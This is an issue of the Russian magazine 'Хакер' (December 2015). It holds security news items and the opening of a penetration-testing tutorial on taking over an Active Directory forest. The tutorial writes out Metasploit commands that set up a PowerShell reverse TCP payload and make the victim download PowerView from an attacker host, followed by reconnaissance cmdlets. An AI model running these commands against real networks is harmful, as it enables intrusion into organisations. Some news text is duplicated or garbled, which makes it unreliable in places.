                                                 ДЕКАБРЬ 2015


                            №203

16 хакерских                                        Пишем
аддонов для                                                 геотроян
Chrome                                                     под
                                                               Android





Изолируем                                            8 способов
вредоносные                                           использовать
процессы                                                 старый
в Windows                                           смартфон                              Cover Story
 ЛЕСОРУБЫ
  WINDOWS          ЗАХВАТЫВАЕМ ВЕСЬ ЛЕС
           ACTIVE DIRECTORY
                                            декабрь 2015
          № 203





  MEGANEWS
Всё новое за последний месяц

  ЛЕС ПОД КОНТРОЛЕМ
Захватываем весь лес Active Directory

 WWW2
Интересные веб-сервисы

  ХРОМОВЫЙ СПЛАВ
Как выковать из браузера хакерский инструмент

  БЕЗОПАСНОСТЬ В KASPERSKYOS
Операционная система «Лаборатории Касперского» изнутри

  ДОРОГУ СТАРИКАМ!
Восемь способов использовать старый смартфон на Android

  ДЖЕЙЛБРЕЙК ДЛЯ ВСЕХ И КАЖДОГО
Что делать после того, как выполнен взлом устройства

  ОДНОРУКИЙ БАНДИТ
Используем гуглофон и айфон одной рукой без неудобств

  КАРМАННЫЙ СОФТ
Выпуск #14. iOS 9 и все-все-все

  МЕЧТАЕТ ЛИ MICROSOFT О CYANOGENMOD?
Колонка Евгения Зобнина

  EASY HACK
Хакерские секреты простых вещей

  ОБЗОР ЭКСПЛОИТОВ
Анализ свеженьких уязвимостей

  ПОГРУЖЕНИЕ В КРИПТУ. ЧАСТЬ I: ИСТОРИЧЕСКИЕ ШИФРЫ
Как работают самые известные шифры в истории? Все наглядно и по полочкам!

  SPY GAMES
Колонка Юрия Гольцева

  СКРЕЩИВАЕМ ЕЖА С УЖОМ
как обеспечить изоляцию процессов и не сломать Windows

  X-TOOLS
Софт для взлома и анализа безопасности

  ПОЛНЫЙ ГАЙД ПО БОРЬБЕ С МАЛВАРЬЮ
Выдай своему младшему брату, пусть сам все делает!

  ANDROID 5.0: КОДИМ ИНТЕРФЕЙСЫ БУДУЩЕГО
Изучаем Material Design от Google на практике

  СЛЕДИМ ЗА ДЕВУШКОЙ С ПОМОЩЬЮ ANDROID
С ее согласия, разумеется!

  КАРЬЕРА С ОТКРЫТЫМ ИСХОДНЫМ КОДОМ
Как стать участником опенсорсного проекта, даже если не умеешь писать код

  СВОЯ СИНЕМА
Знакомимся с медиасервером Emby

  ПТИЧЬЯ БОЛЕЗНЬ
Обзор уязвимостей в *nix за 2015 год

  ПО СЛЕДАМ БРОДЯГИ
Знакомимся с системой деплоя приложений Otto

  PXE — ГРУЗИМ ВСЕ! Мультизагрузка по локальной сети
Часть 3

  FAQ
Вопросы и ответы

  ТИТРЫ
Кто делает этот журнал
                                         Мария «Mifrill» Нефедова
                                                       nefedova.maria@gameland.ru





MICROSOFT АТАКУЕТ

          ноябре 2015 года компания Microsoft предприняла на рынке несколь-
           ко довольно агрессивных действий.
            Начало месяца было позитивным. В середине ноября компания
         даже закрыла в продуктах семейства Windows несколько критиче-
           ских уязвимостей, которым были подвержены все версии ОС, начи-В
ная с Windows Vista и заканчивая Windows 10. Один бюллетень безопасности
закрыл баг с memory corruption (нарушением целостности информации в опе-
ративной памяти) в Internet Explorer. Через этот баг атакующий мог получить
доступ к машине жертвы с теми же правами, что и залогиненный пользова-
тель. Уязвимость коснулась и нового браузера компании — Edge. Второй бюл-
летень закрыл бреши, которые позволяли атакующему удаленно исполнить
произвольный код на машине жертвы. Восемь других бюллетеней (с MS15-116
по MS15-123) содержали исправления «важных» багов в Microsoft Office, .NET
Framework и Skype.
   Однако в это же время вышло первое большое обновление для Windows
10, известное как Threshold 2, Windows 10 Fall Update или Windows 10 November
Refresh. В него, по словам разработчиков, вошли функции, которые Microsoft
исходно планировала добавить еще в релиз-версию операционной системы.
Однако, как оказалось, кроме обещанных функций, добавили и такие, которые
способны обрадовать разве что самых мрачных параноиков: после этого ап-
дейта система снова начала шпионить за пользователем. Более того — она
начала без спроса удалять программы.
   Оказалось, апдейт самостоятельно деактивирует ряд программ, в числе
которых инструменты для мониторинга железа CPU-Z и Speccy, а также AMD
Catalyst Control Center, Cisco VPN и даже некоторые драйверы SATA. После
установки обновления и перезагрузки устройства пользователь получает со-
общение о том, что программа более не совместима с Windows 10, поэтому
была удалена. Все файлы приложения переносятся в каталог Windows.old, где
не могут причинить системе вреда.
   Стоит сказать, что до выхода свежего обновления подвергшиеся удалению
программы действительно работали не совсем корректно. Все они часто ава-
рийно завершали свою работу, что порой приводило к синему экрану смерти.
Пользовательское соглашение разрешает операционной системе предприни-
мать такие шаги, если приложение представляет угрозу безопасности системы
или неспособно работать должным образом под управлением Windows 10.
  Еще один существенный недостаток ноябрьского апдейта обнаружили
не сразу. Первым некую странность заметил исследователь Эрик Воган (Eric
Vaughan), о чем и рассказал в своем блоге. Оказывается, компания Microsoft во-
все не удалила из системы сервис Diagnostics Tracking Service, который куриро-
вал работу шпионско-диагностического процесса DiagTrack. Компания попро-
сту переименовала его в Connected User Experiences and Telemetry. Более того,
после обновления пользовательские настройки обнулились, то есть система
вновь шпионит за пользователем, будто ранее ей не запрещали этого делать.
   Эрик Воган пишет, что способ деактивации остался прежним: лучше всего
отключить сервис через services.msc. Хотя сам эксперт предпочел удалить его
вовсе.
  Еще один неоднозначный шаг MS — объявление о том, что с 12 января 2016
года будет официально прекращена поддержка всех версий браузера Internet
Explorer, за исключением новейшей IE11. Конечно, компания просто действует
рационально: теперь, когда у Microsoft есть новый браузер Edge, ей больше
не нужен Internet Explorer. Та половина интернета, которая занималась разра-
боткой и поддержкой веб-сервисов, вздохнула после этой новости с облегче-
нием. Однако бизнес-сегмент и госучреждения будут вынуждены перейти на
IE11 или Edge, так как по закону они обязаны использовать актуальные версии
программного обеспечения, которые поддерживает производитель.
   Таким нехитрым способом Microsoft начала «пропихивать» новую версию
своего браузера на рынок. А чтобы лучше мотивировать обновиться обычных
пользователей, Microsoft перечислила возможные риски, которые могут воз-
никнуть из-за использования старых версий. Среди них — уязвимость перед
лицом вирусов, шпионского ПО и прочих вредоносов, а также тот факт, что
современный софт зачастую не поддерживает устаревшие версии браузеров
вовсе. Почему за все эти годы данные уязвимости так и не были устранены
— компания предпочла не пояснять.
   Наконец, третью атаку в ноябре Microsoft провела на платформу Android,
решив последовать примеру Apple. В сентябре 2015 года компания Apple пред-
ставила приложение для Android с лаконичным названием Move to iOS («Пе-
реходи на iOS»). Программа, наделавшая много шума, помогает за несколько
простых шагов перенести на iOS всю личную информацию: контакты, историю
сообщений, фотографии и видеоролики, закладки из браузера, почтовые ак-
каунты, календарь.
   Microsoft решила сделать нечто похожее. Ее приложение AppComparison
после инсталляции на Android изучает девайс и установленные на нем при-
ложения, а затем рассказывает, какие из них будут доступны на Windows 10
Mobile. Для тех приложений, которых на Windows Mobile 10 нет, программа пыта-
ется подобрать подходящие аналоги. Просто и наглядно... если бы не одно но:
мобильная Windows 10 до сих пор испытывает серьезную нехватку самых раз-
ных программ, на что моментально указали пользователи. Так что попытка вы-
шла смелая, но довольно спорная. Впрочем, время покажет.
ANONYMOUS VS ISIS
          о следам кровопролитных терактов в Париже, случившихся 13 ноя-
          бря 2015 года, хактивисты Anonymous объявили войну Исламскому
           государству (ранее ИГИЛ). Группировка опубликовала официальное
           видео, провозглашающее начало #OpParis (операции «Париж») —
          скоординированной кампании по выслеживанию членов ИГ и им
 «сочувствующих» в социальных сетях и в интернете вообще.П
    Послание Anonymous записано на французском языке и традиционно ис-
 пользует синтезатор речи. Человек в маске Гая Фокса «читает» с листа:
    «Anonymous со всего мира будут преследовать вас. Ожидайте массиро-
 ванныхкибератак.Войнаобъявлена.Готовьтесь.
    Знайте,чтомынайдемвасибольшеуженеотпустим.Мыначинаемкруп-
 нейшуювисторииоперациюпротиввас.НародФранциисильнеевас,апрой-
 дячерезэтотужас,онстанетещесильнее».
    Ранее Anonymous уже проводили операцию #OpISIS, начатую после атаки
 на издание Charlie Hebdo в январе 2015 года. В ходе #OpISIS хактивисты взло-
 мали, дефейснули и лишили маскировки множество сайтов, а также обнаро-
 довали данные о тысячах Twitter-аккаунтов экстремистов ИГ.
   Заявление Anonymous повлекло за собой быстрое развитие событий. Уже
через пять дней, 17 ноября 2015 года, в официальном твиттере #OpParis по-
явилась запись о том, что Anonymous успешно «вывели из строя» более 5500
аккаунтов членов ИГ в социальной сети.
   Поддержали идею кибервойны против ИГ и этичные хакеры из контртерро-
ристической группы Ghost Security Group (GSG): анонимный член группы рас-
сказал о нескольких Bitcoin-кошельках, которые предположительно использу-
ются ИГ для финансирования террористических операций. Один из изученных
хакерами аккаунтов на тот момент содержал порядка трех миллионов долла-
ров в биткойнах. Публичным же проявлением позиции Ghost Sec был взлом
пропагандистского сайта ИГИЛ в сети Tor, где хакеры тонко поиздевались над
экстремистами: на агитационном ресурсе Isdarat появился баннер фармацев-
тического сайта, который за биткойны продает любые средства, от виагры до
прозака. Кроме баннера, хакеры оставили послание:
  «Слишком много ИГИЛ. Успокойтесь. Слишком много людей вовлече-
но в эту ИГИЛ-фигню. Пожалуйста, посмотрите эту замечательную рекламу,
покамыобновляемнашуинфраструктуру,чтобыпредоставитьвампобольше
ИГИЛ-контента,котороговытакжаждете».
   Каким образом члены Ghost Sec взломали сайт, неизвестно. Но недавно
эксперт по информационной безопасности Скот Тербан (Scot Terban) расска-
зал в своем блоге, что члены ИГ допускают абсолютно «детские» ошибки. Сто-
ит хотя бы сказать, что сайты ИГ зачастую работают под управлением уязви-
мых версий WordPress.
   Запрещенное в РФ решением Верховного суда Исламское государство,
в свою очередь, не оставило без внимания выпады Anonymous: по офици-
альным каналам ИГ распространили «памятку», информирующую о том, как
нужно вести себя в интернете, чтобы не попасть под атаку хактивистов. Тер-
рористам ИГ и «сочувствующим» рекомендуют не открывать ссылки, полу-
ченные из неизвестных источников, почаще менять IP-адреса, не разговари-
вать в Telegram и других IM с незнакомыми людьми, не пользоваться в Twitter
личными сообщениями и не создавать email-адресов, аналогичных имени
пользователя в Twitter.
   Совет «не разговаривать в Telegram с незнакомыми людьми», впрочем, вы-
глядит излишним: в ноябре сервис самостоятельно провел массовую зачистку
каналов, которые используются террористами. Официальный Twitter мессен-
джера сообщил о бане 78 каналов, так или иначе связанных с деятельностью
Исламского государства; в основном компания ориентировалась на жалобы
пользователей, присланные на адрес abuse@telegram.org. Кроме того, част-
ные исследователи напоминают, что Telegram нельзя считать идеально защи-
щенным и абсолютно непрослушиваемым: многие методы шифрования в нем
отключены автоматически, оставшиеся — требуют аккуратной настройки.
   Однако не все хакеры мира противостоят ИГ, среди них есть и сочувствую-
щие. В ноябре Госдеп стал жертвой атаки иранских хакеров, длившейся почти
месяц: хакеры сумели вычислить конкретных сотрудников, которые занимают-
ся вопросами Ирана и Ближнего Востока, после чего на них была направлена
фишинговая атака, затронувшая почту и социальные сети. Интересно, что со-
трудники Госдепартамента не замечали ничего необычного, пока им не нача-
ли приходить уведомления от Facebook: социальная сеть предупреждала, что
аккаунты сотрудников были скомпрометированы и стали предметом интереса
спонсируемых правительствами хакерских групп. Очевидно, сами госслужа-
щие до сих пор не знакомы даже с базовыми правилами сетевой безопасно-
сти и не знают, что такое фишинг.
   Facebook запустила эту систему оповещения пользователей в конце ок-
тября. Тогда социальная сеть пообещала предупреждать жертв атак «прави-
тельственных» хакеров только при наличии «неоспоримых улик, подтверждаю-
щих данные выводы». Похоже, сейчас мы видим первый яркий пример работы
новой системы — а также первые признаки того, что крупные интернет-компа-
нии не собираются оставаться в стороне от политики.

КУКЛА HELLO BARBIE
С WI-FI МОЖЕТ
СТАТЬ ИДЕАЛЬНЫМ
ШПИОНОМ

          овая кукла фирмы Mattel, Hello Barbie, оказалась отличным шпион-
          ским девайсом: она оснащается Wi-Fi и все время поддерживает
           связь с серверами компании-производителя.
            За технологией искусственного интеллекта Hello Barbie стоит
          компания ToyTalk. «Мы позволяем родителям контролировать дан-Н
ные их детей, начиная от предоставления родительского согласия и закан-
чиваятем,чтомыпозволяемимпрослушиватьиудалятьлюбыевзаимодей-
ствия ребенка с Hello Barbie», — говорят представители компании. Игрушка
способна поддерживать связный диалог со своим маленьким пользователем,
а все сказанное ребенком записывается и отправляется на серверы компании
ToyTalk, в свою очередь подключенные к сервису распознавания речи Google.
Серверы обрабатывают полученную фразу и возвращают ответ, который кукла
озвучивает ребенку при помощи синтезатора голоса. Все разговоры ребенка
с устройством сохраняются в облаке в обычных нешифрованных MP3-файлах.
  Любому человеку, хоть немного знакомому с правилами сетевой безопас-
ности, уже должно стать ясно, что игрушка небезопасна. Куда отправляются
записанные разговоры? Почему они не шифруются? Кто может их прослушать?
Что будет, если записи попадут не в те руки? Более того, оказалось, что кукла
активна даже тогда, когда режим «разговора» отключен: Hello Barbie постоян-
но слушает все, что происходит вокруг. Компания ToyTalk ничуть не смущается
этого факта: в пользовательском соглашении написано, что в худшем случае
ToyTalk рассмотрит все поступившие судебные иски и претензии в установ-
ленном законом порядке.
   Специалист по информационной безопасности Мэтью Якубовски и вовсе
рассказал телеканалу NBC о том, что куклу можно взломать. Якубовски сумел
узнать имя Wi-Fi-сети, к которой подключена кукла, ее MAC-адрес, ID аккаун-
та, к которому привязана игрушка, а также получил доступ к части MP3-фай-
лов. При желании куклу можно превратить в переносной шпионский гаджет,
который записывает все, что слышит. Заодно она станет и точкой входа в чу-
жую Wi-Fi-сеть.
  «Обладаятакойинформацией,можноузнать,гдеживутвладельцыкуклы,
чемонизанимаются.Этопростовопросвремени—когдакто-нибудьподме-
нитсерверкомпаниисобственнымизаставиткуклупроизноситьвсе,чтопри-
детвголову», — сказал Якубовски в интервью NBC.
НАЙДЕН СПОСОБ
ПРЕДСКАЗАТЬ
НОМЕР КАРТЫ
AMERICAN EXPRESS

           звестный ИБ-эксперт Сэми Камкар (Samy Kamkar), автор нашумев-
          шего червя Samy, научился предсказывать, каким будет номер кар-
           ты American Express после ее перевыпуска. Также исследователь
          собрал крошечное устройство, которому дал имя MagSpoof. Де-
            вайс, компоненты которого стоят около десяти долларов, способен
 не только предсказать номера карт, но и обманывать PoS-терминалы.И
    Крошечный MagSpoof, чьи габариты сопоставимы с размерами монеты,
 состоит из базовой платы, микроконтроллера Atmel ATtiny85, драйвера L293D
  H-Bridge, батарейки, светодиода, конденсатора, резистора, медной проволо-
ки и кнопки. Собрать такое устройство нетрудно, к тому же Камкар опублико-
вал все исходные данные и инструкции в своем блоге. Однако без алгоритма,
который разработал эксперт, гаджет почти бесполезен.
   Камкар опасается обнародовать подробные данные о проведенном иссле-
довании, так как это неминуемо повлечет за собой волну преступлений. Тем не
менее исследователь рассказал о сути обнаруженной проблемы, не вдаваясь
при этом в частности.
  Все началось с того, что в августе 2015 года Камкар потерял свою карту
American Express. Получив по почте перевыпущенную карту, он заметил некую
странность в последних цифрах ее номера. Камкар сравнил номер новой кар-
ты с номерами трех предыдущих (да, он записывает и хранит номера старых
карт) и обнаружил систему.
   Воодушевившись, исследователь обратился к своим друзьям в Facebook
с просьбой прислать ему последние цифры номеров их действующих и уже
отмененных карт American Express. Ему ответили десять человек, предоста-
вив больше данных для работы. Как это ни парадоксально, но выявленная экс-
пертом система подошла и картам друзей. Камкар осознал, что нашел способ
предсказать полный номер следующей карты American Express.
   Спустя три месяца Камкар создал устройство MagSpoof, чтобы автоматизи-
ровать процесс генерации номеров и наглядно продемонстрировать American
Express, какую опасность может представлять подобный алгоритм. Девайс
способен хранить данные о сотне банковских карт. Кроме того, MagSpoof из-
лучает сильный электромагнитный сигнал, с помощью которого можно обма-
нуть сенсор считывающего устройства: MagSpoof посылает беспроводной
сигнал, который имитирует физическое сканирование карты.
   Исследователь признает, что данная атака не позволяет узнать четы-
рехзначный CVV-номер, из-за чего область применения атаки сокращается.
Еще один минус: MagSpoof совершенно не похож на банковскую карту, так что
просто передать его для оплаты кассиру или официанту не выйдет. Впрочем,
Камкар отмечает, что так же можно использовать и цифровые устройства для
хранения карт, такие как Coin. Это вызовет куда меньше подозрений.
  В American Express считают, что пользователей охраняет от атаки Камка-
ра дополнительная защита, то есть дополнительный код, который содержится
в магнитной полосе, и chip-and-PIN технология, которая как раз активно вне-
дряется в США. Но Камкар готов с этим поспорить: при коммуникации между
MagSpoof и считывающим устройством хакерский девайс способен послать
ридеру сигнал no-chip, и терминал может принять карту даже в том случае,
если на самом деле она оснащалась чипом.
   Исследователь убежден, что компании American Express стоит как можно
скорее исправить эту проблему.

ПРИЛОЖЕНИЯ SKYPE,
WHATSAPP И YELP
БЕЗ ОСТАНОВКИ
ПРОВЕРЯЮТ СПИСОК
КОНТАКТОВ

          едавно поступивший в продажу смартфон BlackBerry Priv — пер-
          вое устройство на базе Android, выпущенное канадской компанией.
          Специалисты BlackBerry сделали все возможное, чтобы реализо-
           вать свою знаменитую на весь мир безопасность на Android. В част-
           ности, предустановленное приложение DTEK следит за тем, какие
 программы обращаются к списку контактов, данным о местонахождении, тек-Н
 стовым сообщениям, камере и микрофону, тщательно протоколируя время и
 длительность обращений.
   Журналист издания ZDNet Зак Уиттакер (Zack Whittaker) обратил внимание
на странную статистику, которую собрал его Priv. По данным, собранным DTEK,
вышло, что за три дня Skype запрашивал доступ к списку контактов 3484 раза,
WhatsApp 2449 раз и Yelp 165 раз. Официальное приложение Facebook, для
сравнения, запросило его список контактов лишь 78 раз за три дня, Pinterest 11
раз, Dropbox 8 раз, а Instagram всего три раза.
   Список контактов — весьма чувствительное место, ведь он содержит кон-
фиденциальные данные обо всех знакомых людях. В целом нет ничего удиви-
тельного в том, что Skype и WhatsApp требуют разрешения на доступ к списку
контактов. Yelp тоже должен сверяться с контакт-листом, чтобы узнать, у кого
из друзей пользователя установлен Yelp и кто находится неподалеку. Но если
Uber во время поездки может сверяться с местонахождением пользователя
сотни раз (и это оправданно, ведь приложение в реальном времени отслежи-
вает перемещения клиентов), то в случае Skype, WhatsApp и Yelp такое поведе-
ние выглядит странным и чрезмерным.
   Уиттакер постарался связаться с представителями компаний и попросил их
прокомментировать ситуацию. Представитель Skype сообщил, что «Skype бу-
дет обновлять вашу телефонную книгу довольно часто, с целью поддержания
списка контактов Skype в актуальном виде, а также для корректного опреде-
ления их сетевого статуса». Представитель Yelp сообщил, что компания пока
не может дать конкретного ответа, так как Android-подразделение проводит
проверку, но подчеркнул, что компания не хранит контактные данные на своих
серверах. Попытки связаться с Facebook, которой принадлежит мессенджер
WhatsApp, не увенчались успехом: компания игнорирует вопросы журналиста.
   Уиттакер резюмирует, что, по сути, ни одна компания не дала четкого отве-
та на вопрос «зачем?». Журналист понимает, что такое поведение приложений
может объясняться просто плохим качеством кода и банальным недосмотром
разработчиков, но без веских доводов со стороны производителей все это вы-
глядит зловеще.Исследователь убежден, что компании American Express стоит
как можно скорее исправить эту проблему.
ИССЛЕДОВАНИЕ:
КУДА ШЛЮТ ДАННЫЕ
ПРИЛОЖЕНИЯ
ДЛЯ ANDROID

         оманда исследователей из MIT и UWin Software изучила 500 наибо-
          лее популярных приложений для Android. Выяснилось, что лишь по-
          ловину их запросов можно отнести к стандартным пакетам; другая
          половина трафика уходит в неясном направлении, и зачастую даже
          не совсем понятно, зачем нужен тот или иной канал связи, так как
 на работу приложения он не влияет. оманда исследователей из MIT и UWinК
  Software изучила 500 наиболее популярных приложений для Android. Выясни-
лось, что лишь половину их запросов можно отнести к стандартным пакетам;
другая половина трафика уходит в неясном направлении, и зачастую даже не
совсем понятно, зачем нужен тот или иной канал связи, так как на работу при-
ложения он не влияет.
   Ради эксперимента эксперты вообще запретили 47 приложениям общать-
ся с третьими сторонами. Тридцать из этих модифицированных приложений
продолжили работать как ни в чем не бывало. Еще девять лишились рекла-
мы, но в целом функционировали. В трех случаях программы демонстрирова-
ли небольшие сбои в работе. Так, популярное приложение-фонарик, которое
предлагает пользователям платный апгрейд, лишилось иконки на экране ап-
грейда. Еще пять приложений полностью перестали работать. Как минимум
в одном случае проблема крылась в защите, которую разработчики встрои-
ли в приложение, чтобы защитить свой проприетарный код. Почему отказали
оставшиеся четыре программы — неясно.
   «Аналитические сервисы собирают информацию о производительно-
сти приложения, аварийных завершениях работы, рабочих характеристиках
устройств,атакженаблюдаютзадействиямипользователявовремяработыс
приложением.Хотяэтаинформацияимеетявнуюценностьдляразработчиков,
пользовательненайдетнигдеописанияцелейичастотысбораэтихданных.
Посути,некоторыеприложенияначинаютсобиратьданныеещедофактиче-
ской активации. К примеру, Twitter, Walmart и Pandora начинают сбор данных
сразуже,кактолькоустройствовключается,ипродолжаютпериодическивы-
ходитьнасвязь,покаустройствоостаетсявключенным.Самоприложениепри
этомможетвообщенеиспользоватьсяниразу.Вбольшинствеслучаевполь-
зовательникакнеможетпрекратитьподобныйсборданных,неудаливприло-
жение», — пишут исследователи в докладе.
   Команда экспертов подчеркивает, что они не призывают немедленно изба-
виться от всех этих каналов передачи данных, запретив все оптом. Просто ис-
следователи полагают, что пользователи имеют право знать о происходящем
и должны иметь возможность отказаться от сбора информации.

ЭДВАРД СНОУДЕН
УВЕРЕН: БЛОКИРОВАТЬ
РЕКЛАМУ ДОЛЖЕН
КАЖДЫЙ

            стати, о Сноудене. В середине ноября
         Эдвард Сноуден дал интервью изданию
          The Intercept. В ходе беседы речь зашла
          о блокировке рекламы, и бывший сотруд-
           ник ЦРУ и АНБ высказался достаточноК
резко: Сноуден сообщил, что использование блокировщиков — «этонепро-
стовашеправо,этовашаобязанность».
  «Мызнаемотом,чтоинтернет-провайдеры,втомчислеComcast,AT&Tи
другие,внедряютрекламупрямоввашHTTP-трафик,— рассказал Сноуден.
— До тех пор пока провайдеры услуг будут использовать рекламу с приме-
нениемактивногоконтента,дляотображениякоторойпонадобятсяJavaScript
илиFlash,всечтоугодноможетстатьпотенциальнымвектороматакинаваш
браузер, и вы должны активно пытаться все это заблокировать. Поставщи-
ки услуг даже не пытаются обеспечить безопасность священных отношений
междучитателемииздателем,поэтомууваснепростоестьправозащищать
себясамостоятельно,этовообщевашапрямаяобязанность».
   Также Сноуден поделился и другими мыслями о приватности и безопасности
в интернете, дав пару традиционных советов читателям. Так, Сноуден рекомен-
дует пользоваться менеджерами паролей, настроить везде, где только можно,
двухфакторную аутентификацию, а в качестве браузера использовать Tor.
  «Ясчитаю,чтоTor—этоодинизважнейшихнасегоднятехнологических
проектов,направленныхнаулучшениеприватности.ЛичнояпользуюсьTorпо-
стоянно», — говорит Сноуден.
МЯУ, Я
ЛЮБЛЮ
КОТО-
ФАКТЫ

«[Моя]основнаяцель—ознакомитьлюдейсоперативнойбезопасностью», —
рассказал анонимный разработчик, который завалил людей, публикующих
свои телефонные номера в открытом доступе, спам-сообщениями с интерес-
ными фактами о котиках. Чтобы прекратить волну спама, пользователям нуж-
но было отправить Эдварду Сноудену твит: «Мяу, я <3 котофакты» (Meow, I <3
catfacts).
   «Когда люди выкладывают в Twitter фотографии своих водительских прав
илибанковскихкарт,ониобычнопонимаютсвоюошибку,когдакто-нибудьде-
лаетретвитэтойзаписи.Нокогдаонипубликуютсвойномертелефона,они
считают, что здесь нет ничего такого. Если бы отправленные им сообщения
носили вредоносный характер, их бы могли с легкостью взломать», — пояс-
няет доброжелательный спамер, имея в виду, в частности, уязвимость Android
Stagefright, из-за которой даже безобидное на вид сообщение может ском-
прометировать устройство.
   Поиск телефонных номеров и отправка на них сообщений были автомати-
зированы при помощи двух скриптов. Первый скрипт через API социальной
сети собирает телефонные номера, «используя список ключевых слов и регу-
лярные выражения, чтобы отфильтровать локальные номера телефонов». Вто-
рой скрипт использует различные веб-сайты для рассылки СМС (разработчик
отмечает, что такой СМС-спам возможен из-за очень слабой CAPTCHA на
данных ресурсах). Как только жертва пишет твит на имя Эдварда Сноудена, ее
сразу исключают из рассылки фактов о кошках.
   «Когдаон[ЭдвардСноуден]толькоприсоединилсякTwitter,онсказал,что
емунравятсякошки.Онборетсязамаксимальнуюзащитулюбойличнойин-
формации, тогда как огромное количество людей свободно публикует свои
личныеданные,припомощикоторыхихможноидентифицировать.Ясчитал,
чтонекоторыеизнихоценятшутку,когдаим,из-засобственнойнекомпетент-
ностиввопросахбезопасности,придетсяписатьСноудену,нооказалось,что
большинствоизнихпонятиянеимеют,ктотакойСноуден», — рассказал раз-
работчик.
   Теперь его жертвы определенно знают много интересного о кошках. Хочет-
ся верить, что о безопасности в интернете они тоже кое-что узнали.
COVERSTORY





                                                                           Александр Дмитренко
                                                                                           PENTESTIT
                                                                                                              sinister@pentestit.ruЛЕС ПОД
КОНТРОЛЕМ
ЗАХВАТЫВАЕМ ВЕСЬ ЛЕС ACTIVE DIRECTORY
Active Directory — явление, довольно часто встречающе-
еся при тестировании безопасности крупных компаний.
Нередко попадается не одинокий домен в единственном
лесу, а более ветвистая и более интересная структура.
Поэтому сегодня мы поговорим о том, как проводить раз-
ведку, изучать структуру леса, рассмотрим возможности
поднятия привилегий. А завершим полной компрометаци-
ей всего леса предприятия!

О ЧЕМ НА ЭТОТ РАЗ
Не секрет, что многие, если не большинство крупных компаний используют
службу каталогов Active Directory от небезызвестной MS. Причина достаточно
очевидна.
   Такой подход позволяет многие вещи автоматизировать, интегрировать
все в одну слаженную структуру и облегчить жизнь как IT-отделу, так и всем
сотрудникам.
   Как правило, если организация довольно большая, то, развиваясь, она мо-
жет приобретать другие (более мелкие) компании, устраивать слияния, рас-
ширения и прочие радости крупного бизнеса. Все это сказывается на струк-
туре леса AD, который пополняется новыми деревьями и разрастается вширь
и вглубь. Именно о такой разветвленной структуре мы и будем разговаривать.
А начнем, по традиции, с небольшого теоретического введения.

В ДРЕМУЧИХ ЛЕСАХ AD
Бегло рассмотрим ключевые понятия Active Directory, которые постоянно будут
использоваться в дальнейшем. Начнем от наименьшей структурной единицы
AD — домена.
  Доменом можно назвать логическую группу (пользователей, хостов, сер-
веров и так далее), которые поддерживают централизованное администриро-
вание.
  Деревом называется набор доменов, которые используют общее про-
странство имен (по аналогии с обычным DNS). Важно, что дочерний домен ав-
томатически получает двухсторонние доверительные отношения с родитель-
ским доменом.
  Доверие — это своеобразное соглашение между двумя доменами, уста-
навливающее разрешения на доступ к тем или иным объектам или ресурсам.
   Ну а лес, в свою очередь, является наиболее крупной структурой в Active
Directory и объединяет все деревья. В результате все деревья в лесу обычно
объединены двунаправленными доверительными отношениями, что позволя-
ет пользователям в любом дереве получать доступ к ресурсам в любом дру-
гом, если они имеют соответствующие разрешения и права.
  По умолчанию первый домен, создаваемый в лесу, автоматически стано-
вится его корневым доменом.
  Завершив теоретический экскурс, можно переходить к практике, чем и за-
ймемся. При этом мы будем предполагать, что уже получен базовый доступ
с небольшими пользовательскими привилегиями. Допустим, что социнжене-
рия дала свои плоды и после отправки специально сформированного письма
(например, с документом во вложении) кто-то открыл документ и мы получили
шелл.

ПРОВЕРЯЕМ БОЕКОМПЛЕКТ
Перед любыми боевыми действиями неплохо вначале осмотреть свой инстру-
ментарий и определиться, что будет использоваться. Для изучения Windows-о-
кружения самый удобный инструмент на сегодняшний день — это PowerShell.
Почему? Да потому, что он везде установлен (начиная с Windows 7/2008R2),
позволяет работать и выполнять разнообразные командлеты рядовым поль-
зователям и глубоко интегрирован в ОС.
   Дефолтная политика, которая запрещает выполнение сторонних (непод-
писанных) PowerShell-скриптов, не является серьезной защитной мерой. Это
просто защита от случайного запуска по двойному клику и очень легко обхо-
дится. По большому счету PowerShell — это целый фреймворк для постэксплу-
атации Windows. Естественно, по этой причине пентестеры уже несколько лет
активно его используют, и написано множество различных модулей (скриптов),
которые помогают автоматизировать те или иные действия.
  Мы будем использовать лишь один такой модуль — PowerView, который вхо-
дит в набор PowerTools. Изначально он создавался в рамках известного про-
екта Veil, но не так давно, после выхода впечатляющего фреймворка PowerShell
Empire (который очень динамично развивается и требует отдельного рассмо-
трения), был перемещен и теперь является подпроектом PS Empire.
   PowerView служит одновременно и заменой всех консольных net*-команд
в Windows, и средством изучения AD. Отдельно стоит еще раз подчеркнуть,
что большинство возможностей доступны с правами обычного пользователя.

ВЫДВИГАЕМСЯ НА ИСХОДНУЮ
Напомню, что базовый доступ у нас уже есть, и для упрощения будем считать,
что у нас есть шелл Meterpreter с правами рядового доменного пользователя.
В этом году работа с PS в Метасплоите стала значительно удобнее, появи-
лось несколько специализированных пейлоадов, чем и воспользуемся. Что-
бы не потерять имеющуюся сессию, создадим новую, используя механизм
payload_inject.
Для этого выполняем:

msf > use exploit/windows/local/payload_inject

В качестве полезной нагрузки, конечно же, выбираем powershell:

msf exploit(payload_inject) > set PAYLOAD
    windows/powershell_reverse_tcp

Теперь можно сразу указать модуль, который нужно импортировать в случае
успешного запуска:

msf exploit(payload_inject) > set LOAD_MODULES
    http://10.54.0.181/powerview.ps1

Отмечу, что при желании можно даже указывать полный адрес до GitHub, в на-
шем случае PowerView будет скачиваться жертвой прямо с хоста атакующего.
Последним штрихом необходимо указать номер уже имеющейся сессии:

msf exploit(payload_inject) > set SESSION 1

Запускаем на выполнение (результат на рис. 1).





Рис. 1. PowerShell-сессия

СИТУАЦИОННАЯ ОСВЕДОМЛЕННОСТЬ
Теперь, когда у нас есть интерактивный PowerShell, можно внимательно изу-
чить обстановку. Первым делом пригодятся две следующие команды:
•  Get-NetForestDomain — покажет все домены в лесу (рис. 2);
•  Get-NetDomainTrust — покажет доверительные отношения домена, в кото-
  ром мы сейчас находимся (рис. 3).
Рис. 2. Фрагмент вывода Get-NetForestDomain





Рис. 3. Результат Get-NetDomainTrust


Так как лес у нас не очень маленький и по полученному списку доменов не очень
понятно, какова его структура, то можно попробовать составить наглядную
визуальную карту.
  Для этого сначала сохраним карту доверительных отношений в CSV-файл:

Invoke-MapDomainTrust | Export-CSV -NoTypeInformation trusts.csv
Этот командлет сперва изучит текущий домен, а затем рекурсивно пробежит-
ся по всем доверительным отношениям с каждым доменом, до которого смо-
жет дотянуться.
   Результат будет сохранен в CSV-файл, где будут описаны все домены и все
